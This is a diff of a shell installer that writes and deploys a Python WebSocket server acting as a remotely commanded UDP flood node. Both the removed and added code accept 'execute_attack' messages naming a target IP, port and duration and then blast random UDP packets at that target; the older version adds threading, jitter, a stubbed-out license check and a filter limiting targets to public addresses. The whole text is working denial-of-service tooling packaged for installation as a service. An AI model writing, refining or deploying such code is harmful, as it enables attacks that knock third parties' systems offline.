@@ -17,88 +17,36 @@ cd "$INSTALL_DIR"
 # Step 2: Deploy working ws_server.py
 cat > $PY_SCRIPT << 'EOF'
 import asyncio
+import websockets
 import json
 import socket
-import threading
-import time
 import random
-import logging
-import websockets
+import time
 
-logging.basicConfig(filename="attack_validation.log", level=logging.INFO)
-session_validated = {}
-
-def adaptive_delay():
-    return random.uniform(0.2, 0.7)
-
-def udp_flood(ip, port, duration):
-    print(f"[ATTACK] UDP flood STARTED to {ip}:{port} for {duration}s")
-    end = time.time() + duration
-
-    def spam():
-        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        while time.time() < end:
-            try:
-                payload = random._urandom(random.randint(100, 1400))
-                sock.sendto(payload, (ip, port))
-                time.sleep(adaptive_delay())
-            except Exception as e:
-                time.sleep(1)
-        sock.close()
-
-    threads = []
-    for _ in range(10):
-        t = threading.Thread(target=spam)
-        t.start()
-        threads.append(t)
-    for t in threads:
-        t.join()
-
-def is_public_ip(ip):
-    return not (ip.startswith("10.") or ip.startswith("192.168.") or ip.startswith("172.16.") or ip.startswith("127."))
-
-def validate_key(key, hwid):
-    print("[VALIDATION] Bypassed for test - key:", key, "HWID:", hwid)
-    return True
-
-async def handler(websocket):
+async def handler(websocket, path):
     async for message in websocket:
         try:
             print("[RECEIVED]", message)
             data = json.loads(message)
-
-            if data.get("command") != "execute_attack":
-                await websocket.send("Invalid command.")
-                continue
-
-            key = data.get("key")
-            hwid = data.get("hwid")
-            ip = data.get("target_ip")
-            port = int(data.get("target_port"))
-            duration = int(data.get("duration"))
-
-            if not validate_key(key, hwid):
-                await websocket.send("AUTH_FAILED: Invalid or expired key.")
-                continue
-
-            if not is_public_ip(ip):
-                await websocket.send("Blocked non-public IP target.")
-                continue
-
-            print(f"[DISPATCH] UDP flood to {ip}:{port} for {duration}s")
-            threading.Thread(target=udp_flood, args=(ip, port, duration)).start()
-            await websocket.send("UDP flood dispatched.")
-
+            if data.get("command") == "execute_attack":
+                ip = data["target_ip"]
+                port = int(data["target_port"])
+                duration = int(data["duration"])
+                if data["attack_type"] == "udp_flood":
+                    end = time.time() + duration
+                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                    while time.time() < end:
+                        sock.sendto(random._urandom(1024), (ip, port))
+                await websocket.send("Attack complete.")
         except Exception as e:
-            await websocket.send(f"Error occurred: {str(e)}")
+            await websocket.send(f"Error: {e}")
 
 async def main():
     async with websockets.serve(handler, "0.0.0.0", 5000):
         print("[+] WebSocket server running on port 5000")
         await asyncio.Future()
 
-if __name__ == "__main__":
-    asyncio.run(main())
+asyncio.run(main())
 EOF
 
 # Step 3: Create Systemd Service
